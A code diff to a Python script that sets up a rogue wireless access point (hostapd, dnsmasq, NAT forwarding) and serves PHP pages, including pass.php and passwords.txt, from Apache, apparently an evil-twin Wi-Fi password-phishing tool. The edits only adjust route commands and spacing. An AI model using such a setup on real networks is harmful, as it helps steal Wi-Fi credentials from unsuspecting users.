@@ -9,7 +9,7 @@ def reset_setting():
     os.system('service apache2 stop')
     os.system('service hostapd stop')
     os.system('service dnsmasq stop')
-    os.system('service rpcbind stop')
+    #os.system('service rpcbind stop')
     os.system('killall dnsmasq >/dev/null 2>&1')
     os.system('killall hostapd >/dev/null 2>&1')
     os.system('systemctl enable systemd-resolved.service >/dev/null 2>&1')
@@ -17,7 +17,7 @@ def reset_setting():
 
 def AP_on(iface):
     os.system('systemctl disable systemd-resolved.service >/dev/null 2>&1')
-    os.system('systemctl stop systemd-resolved>/dev/null 2>&1')
+    os.system('systemctl stop systemd-resolved >/dev/null 2>&1')
     os.system('service NetworkManager stop')
     os.system(' pkill -9 hostapd')
     os.system(' pkill -9 dnsmasq')
@@ -26,9 +26,8 @@ def AP_on(iface):
     os.system(' pkill -9 dhclient')
     os.system('killall dnsmasq >/dev/null 2>&1')
     os.system('killall hostapd >/dev/null 2>&1')
-    set_ap_ip="ifconfig "+ iface +" 10.0.0.1 netmask 255.255.255.0"
-    os.system(set_ap_ip)
-    os.system('route add default gw 10.0.0.1')
+    os.system("ifconfig "+ iface +" 10.0.0.1 netmask 255.255.255.0")
+    #os.system('route add default gw 10.0.0.1')
     os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
     os.system('iptables --flush')
     os.system('iptables --table nat --flush')
@@ -38,12 +37,13 @@ def AP_on(iface):
 
 def run_AP():
 	os.system('dnsmasq -C dnsmasq.conf')
-	os.system('route add default gw 10.0.0.1')
+	#os.system('route add default gw 10.0.0.1')
 	os.system('hostapd hostapd.conf -B')
 	os.system('route add default gw 10.0.0.1')
 
 def start_apache():
     os.system('service apache2 start')
+    os.system('route add default gw 10.0.0.1')
     os.system('cp html/index.php /var/www/html/')
     os.system('cp html/pass.php /var/www/html/')
     os.system('cp html/passwords.txt /var/www/html/')
